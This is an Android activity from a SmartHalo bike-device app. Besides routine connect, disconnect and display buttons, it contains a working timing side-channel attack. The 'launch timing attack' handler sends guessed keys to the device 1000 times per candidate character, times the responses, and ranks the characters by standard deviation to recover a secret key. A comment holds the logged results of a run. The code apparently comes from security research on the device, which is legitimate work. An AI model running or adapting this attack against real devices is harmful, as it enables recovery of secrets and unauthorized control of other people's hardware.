package bike.smarthalo;

import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import bike.smarthalo.sdk.CmdCallback;
import bike.smarthalo.sdk.SHDeviceService;
import bike.smarthalo.sdk.SHDeviceServiceBinder;
import bike.smarthalo.sdk.SHDeviceServiceIntents;
import bike.smarthalo.sdk.models.DeviceConnectionState;

public class ConnectedToDeviceActivity extends AppCompatActivity {

    private SHDeviceServiceBinder deviceBinder;

    private final BroadcastReceiver deviceServiceUpdateReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent == null) {
                return;
            }
            String action = intent.getAction();
            if (SHDeviceServiceIntents.BROADCAST_ERROR.equals(action)) {

            } else if (SHDeviceServiceIntents.BROADCAST_CONNECTION_STATE.equals(action)) {
                if (deviceBinder.getConnectionState() == DeviceConnectionState.Disconnected) {
                    Intent mainActivity = new Intent(ConnectedToDeviceActivity.this, MainActivity.class);
                    startActivity(mainActivity);
                }
            }
        }
    };

    private void showProgressBarForDisconnecting() {
        final ProgressDialog progressDialog = new ProgressDialog(this);
        progressDialog.setTitle("Disconnecting from device ..");
        progressDialog.show();
    }

    @Override
    protected void onResume() {
        super.onResume();
        registerReceiver(deviceServiceUpdateReceiver, SHDeviceService.getDeviceServiceUpdateIntentFilter());
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(deviceServiceUpdateReceiver);
    }

    private boolean callbackReceived = false;
    private long startTime;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_connected_to_device);

        Button disconnectButton = (Button) findViewById(R.id.disconnect_button);
        disconnectButton.setOnClickListener(v -> {
            showProgressBarForDisconnecting();
            deviceBinder.forgetSavedDeviceAndDisconnect();
        });

        Button showLogoButton = (Button) findViewById(R.id.show_logo_button);
        showLogoButton.setOnClickListener(v -> deviceBinder.ui_logo(null));

        Button speedometerIntroButton = (Button) findViewById(R.id.speedometer_intro_button);
        speedometerIntroButton.setOnClickListener(v -> deviceBinder.ui_speedometer_intro(null));

        Button chargeStateButton = (Button) findViewById(R.id.charge_state_button);
        chargeStateButton.setOnClickListener(v -> deviceBinder.showChargeState(null));

        Button launchTimingAttack = (Button) findViewById(R.id.launch_timing_attack);
        launchTimingAttack.setOnClickListener(v -> {
            /**
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: 3, Std Deviation: 4366137.8906079205
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: 5, Std Deviation: 4451328.511828954
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: 4, Std Deviation: 4645536.3599784095
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: 8, Std Deviation: 4754299.339507784
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: X, Std Deviation: 4993861.169832301
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: 1, Std Deviation: 5183403.822189171
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: 2, Std Deviation: 5289862.027235209
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: 6, Std Deviation: 5822992.852068254
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: 7, Std Deviation: 6206848.756323684
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: 9, Std Deviation: 1.9631121063939374E7
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: R, Std Deviation: 2.2513873902253635E7
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: S, Std Deviation: 2.2521298741702955E7
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: H, Std Deviation: 2.2754837513825182E7
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: G, Std Deviation: 2.2826648678496767E7
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: T, Std Deviation: 2.299239617214078E7
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: F, Std Deviation: 2.3000853596837588E7
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: C, Std Deviation: 2.3039286810324218E7
             * 2023-08-26 14:12:01.019  4772-4772  System.out              bike.smarthalo                       I  Character: N, Std Deviation: 2.307403099906748E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: Y, Std Deviation: 2.3130386906335548E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: J, Std Deviation: 2.315091212340079E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: K, Std Deviation: 2.318494772802106E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: P, Std Deviation: 2.3269173456252605E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: O, Std Deviation: 2.3280256820934713E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: M, Std Deviation: 2.3288575513520677E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: I, Std Deviation: 2.329756260074865E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: Q, Std Deviation: 2.3302529383644257E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: D, Std Deviation: 2.3413093751258925E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: L, Std Deviation: 2.3631957563204765E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: E, Std Deviation: 2.3884281563511297E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: B, Std Deviation: 2.5147021005833868E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: U, Std Deviation: 2.7777701735611625E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: 0, Std Deviation: 2.9308947508840755E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: A, Std Deviation: 3.0537429686155938E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: Z, Std Deviation: 3.3066973018615503E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: V, Std Deviation: 4.279620046452927E7
             * 2023-08-26 14:12:01.020  4772-4772  System.out              bike.smarthalo                       I  Character: W, Std Deviation: 6.891346498579238E7
             */

            final String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

            List<Long> responseTimes = new ArrayList<>();

            Map<Character, Double> charStdDevMap = new HashMap<>();

            for (int i = 0; i < alphabet.length(); i++) {
                responseTimes.clear();

                char currentChar = alphabet.charAt(i);

                for (int j = 0; j < 1000; j++) {

                    callbackReceived = false;
                    startTime = System.nanoTime();
                    deviceBinder.startTimingAttack(currentChar + "Kd57tOAWOkWjxMIZUX6xyFMOWvr5pdK", new CmdCallback() {
                        @Override
                        public void onSuccess() {
                            long responseTime = System.nanoTime() - startTime;
                            responseTimes.add(responseTime);
                            callbackReceived = true;
                        }

                        @Override
                        public void onErr(byte errorCode) {
                            long responseTime = System.nanoTime() - startTime;
                            responseTimes.add(responseTime);
                            callbackReceived = true;
                        }

                        @Override
                        public void onFail() {
                            callbackReceived = true;
                        }
                    });

                    // Wait for the callback to be
                    // received
                    while (!callbackReceived) {
                        try {
                            Thread.sleep(1);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }

                double errorStdDev = calculateStandardDeviation(responseTimes);

                charStdDevMap.put(currentChar, errorStdDev);
            }

            Map<Character, Double> sortedMap = sortByValue(charStdDevMap);

            for (Map.Entry<Character, Double> entry : sortedMap.entrySet()) {
                System.out.println("Character: " + entry.getKey() + ", Std Deviation: " + entry.getValue());
            }
        });

        registerReceiver(deviceServiceUpdateReceiver, SHDeviceService.getDeviceServiceUpdateIntentFilter());
    }

    public static Map<Character, Double> sortByValue(Map<Character, Double> unsortedMap) {
        List<Map.Entry<Character, Double>> list = new LinkedList<>(unsortedMap.entrySet());

        list.sort(Map.Entry.comparingByValue());

        Map<Character, Double> sortedMap = new LinkedHashMap<>();
        for (Map.Entry<Character, Double> entry : list) {
            sortedMap.put(entry.getKey(), entry.getValue());
        }

        return sortedMap;
    }

    public static double calculateStandardDeviation(List<Long> responseTimes) {
        double mean = responseTimes.stream()
                .mapToLong(Long::longValue)
                .average()
                .orElse(0);

        double squaredDiffSum = responseTimes.stream()
                .mapToDouble(responseTime -> Math.pow(responseTime - mean, 2))
                .sum();

        return Math.sqrt(squaredDiffSum / responseTimes.size());
    }

    private ServiceConnection deviceServiceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            deviceBinder = (SHDeviceServiceBinder) iBinder;
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            deviceBinder = null;
        }
    };

    @Override
    protected void onStart() {
        super.onStart();
        Intent shDeviceServiceIntent = new Intent(this, SHDeviceService.class);
        bindService(shDeviceServiceIntent, deviceServiceConnection, Context.BIND_AUTO_CREATE);
    }

    @Override
    protected void onStop() {
        super.onStop();
        unbindService(deviceServiceConnection);
    }
}